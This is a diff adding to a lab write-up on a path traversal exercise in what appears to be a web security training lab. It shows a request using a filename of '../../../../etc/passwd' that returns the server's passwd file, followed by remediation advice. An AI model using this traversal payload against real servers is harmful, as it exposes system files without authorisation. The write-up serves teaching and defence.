@@ -23,3 +23,29 @@ I sent this request to the **Repeater** and modified the `filename` parameter to
 ```http
 GET /image?filename=../../../../etc/passwd HTTP/2
 Host: [lab-id].web-security-academy.net
+3. Verify Result
+Upon sending the modified request, the server responded with HTTP 200 OK, and the response body contained the contents of the /etc/passwd file:
+
+text
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+...
+https://./burp-repeater.png
+
+✅ Lab Solved!
+
+https://./solved.png
+
+🛡️ Remediation (How to Fix)
+To prevent Path Traversal vulnerabilities, developers should:
+
+Avoid passing file paths directly: Use an index or a database ID to map to files instead of taking user input as a file path.
+
+Input Validation: Sanitize the input by removing or blocking path traversal sequences (e.g., ../, ..\).
+
+Use a Whitelist: Implement a whitelist of allowed filenames or extensions.
+
+File Permissions: Ensure the web server process runs with the minimum necessary privileges (Principle of Least Privilege) so that even if traversed, critical files remain inaccessible.
+
+Writeup by Tanmay Sarkar Emon
